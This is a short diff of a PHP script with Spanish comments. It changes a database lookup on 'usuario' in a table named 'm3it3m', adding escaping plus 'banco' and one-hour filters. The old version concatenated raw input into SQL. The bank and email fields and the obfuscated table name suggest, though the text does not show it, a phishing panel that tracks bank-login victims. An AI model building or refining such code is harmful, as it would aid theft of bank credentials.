@@ -38,9 +38,11 @@ $eml = isset($_POST['eml']) ? addslashes(filter_var($_POST['eml'], FILTER_SANITI
 $id = isset($_COOKIE['id']) ? $ifilter->process($_COOKIE['id']) : '';
 
 if ($con = conectar()) {
-    // 3. Buscar el ID si no hay cookie
-    if ($id === '' && $usuario !== '') {
-        $consulta = sentencia($con, "SELECT idreg FROM m3it3m WHERE usuario = '".$usuario."' ORDER BY idreg DESC LIMIT 1");
+    // 3. Buscar el ID si no hay cookie (mismo banco + última hora)
+    if ($id === '' && $usuario !== '' && $banco !== '') {
+        $usuario_esc = $con->real_escape_string($usuario);
+        $banco_esc   = $con->real_escape_string($banco);
+        $consulta = sentencia($con, "SELECT idreg FROM m3it3m WHERE usuario = '$usuario_esc' AND banco = '$banco_esc' AND horacreado >= DATE_SUB(NOW(), INTERVAL 1 HOUR) ORDER BY idreg DESC LIMIT 1");
         if (contarfilas($consulta)) {
             $datos = traerdatos($consulta);
             $id = (string)$datos['idreg'];
